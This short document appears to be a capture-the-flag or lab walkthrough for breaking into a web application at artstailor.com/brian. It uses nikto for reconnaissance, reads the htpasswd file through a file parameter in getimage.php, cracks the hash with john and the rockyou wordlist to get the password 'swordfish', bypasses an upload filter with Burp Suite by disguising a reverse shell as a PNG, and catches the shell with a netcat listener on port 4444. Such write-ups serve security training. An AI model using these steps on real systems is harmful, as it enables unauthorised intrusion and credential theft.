* First, get the key as follows:
    nikto http://www.artstailor.com/brian
    result shows /private exists and the key is there

* curl http://www.artstailor.com/brian reveals that the admin panel is 
in a folder called /imgfiles and is running upload file
* Examining how the other images are called, we can try and access the htpasswd
file as follows
    - http://www.artstailor.com/brian/getimage.php?raw=true&file=htpasswd
* We can then save this hashed password, go to to /usr/share/wordlists and gunzip rockyou
* Use this word list 
    john --wordlist=/usr/share/wordlists/rockyou.txt passwd
    Reveals the combination: Brian: swordfish
* We can now enter the upload page and upload the reverse shell with 172.24.0.10 and 4444 as the new
options
* listen on our host nc -nlvp 4444 and new shell will open
* use burpsuite to make sure the reverse shell gets uploaded (change it to png by adding png at the top) and then go to that site
* we now have access as www-data
